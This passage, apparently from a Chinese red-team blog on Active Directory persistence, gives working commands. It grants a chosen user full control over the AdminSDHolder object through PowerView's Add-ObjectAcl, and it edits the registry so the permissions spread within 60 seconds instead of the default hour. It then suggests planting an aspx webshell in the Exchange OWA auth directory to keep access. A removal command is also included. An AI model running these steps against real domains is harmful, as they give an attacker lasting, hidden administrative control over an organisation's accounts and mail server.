+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Add-ObjectAcl -TargetSearchBase &quot;LDAP://CN=AdminSDHolder,CN=System,DC=rootkit,DC=org&quot;  -PrincipalIdentity dbadmin -Verbose -Rights All</span><br></pre></td></tr></table></figure>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1568215397075.png" alt="1568215397075"></p>
+<p>默认等待60分钟以后，dbadmin获得对所有受保护的AD账户和组的完全访问权限</p>
+<p>可以通过修改注册表的方式设置权限推送的间隔时间，注册表位置如下：</p>
+<ul>
+<li>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\NTDS\Parameters,AdminSDProtectFrequency,REG_DWORD</li>
+</ul>
+<p>例如修改成等待60秒的命令如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add hklm\SYSTEM\CurrentControlSet\Services\NTDS\Parameters /v AdminSDProtectFrequency /t REG_DWORD /d 60</span><br></pre></td></tr></table></figure>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1568215431765.png" alt="1568215431765"></p>
+<p>dbadmin用户可以直接访问域控。</p>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1568215569041.png" alt="1568215569041"></p>
+<h4><span id="删除adminsdholder中指定用户的acl">删除AdminSDHolder中指定用户的ACL</span></h4><p>删除用户dbadmin的完全访问权限，命令如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Remove-DomainObjectAcl -TargetSearchBase &quot;LDAP://CN=AdminSDHolder,CN=System,DC=rookit,DC=org&quot; -PrincipalIdentity dbadmin -Rights All -Verbose</span><br></pre></td></tr></table></figure>
+<h3><span id="非常规方法">非常规方法</span></h3><p>若域控主机为owa主机，即exchange服务器主机，我们可以在owa目录下留一个aspx的木马。用作维持权限。</p>
+<p>在如下目录中加入一个aspx木马。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth</span><br></pre></td></tr></table></figure>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1568213801260.png" alt="1568213801260"></p>
+</div></article></div></section><footer><div class="paginator"><a href="/posts/notes/域渗透-Relay.html" class="next">下一篇</a></div><div class="copyright"><p>© 2016 - 2019 <a href="https://uknowsec.cn">uknow</a>  Stay hungry,Stay foolish.</p></div></footer></div><script>(function(b,o,i,l,e,r){b.GoogleAnalyticsObject=l;b[l]||(b[l]=function(){(b[l].q=b[l].q||[]).push(arguments)});b[l].l=+new Date;e=o.createElement(i);r=o.getElementsByTagName(i)[0];e.src='//www.google-analytics.com/analytics.js';r.parentNode.insertBefore(e,r)}(window,document,'script','ga'));ga('create',"UA-115504647-1",'auto');ga('send','pageview');</script><script>var _hmt = _hmt || [];(function() {var hm = document.createElement("script");hm.src = "https://hm.baidu.com/hm.js?225ebcce29d319519ac7c7690425d1d4";var s = document.getElementsByTagName("script")[0]; s.parentNode.insertBefore(hm, s);})();</script><script src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML"></script></body></html>
